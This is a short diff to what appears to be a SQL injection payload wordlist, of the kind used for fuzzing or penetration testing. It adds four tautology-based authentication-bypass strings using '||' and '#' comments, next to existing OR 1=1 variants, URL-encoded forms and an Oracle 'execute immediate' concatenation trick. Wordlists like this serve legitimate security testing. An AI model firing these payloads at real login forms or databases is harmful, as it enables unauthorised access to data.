@@ -7,6 +7,10 @@
  OR 1=1 --
  OR 1=1 #
  OR 1=1
+'||1=1#
+||1=1#
+'||'a'='a'#
+||'a'='a'#
 )%20or%20('x'='x
 %20or%201=1
 ; execute immediate 'sel' || 'ect us' || 'er'
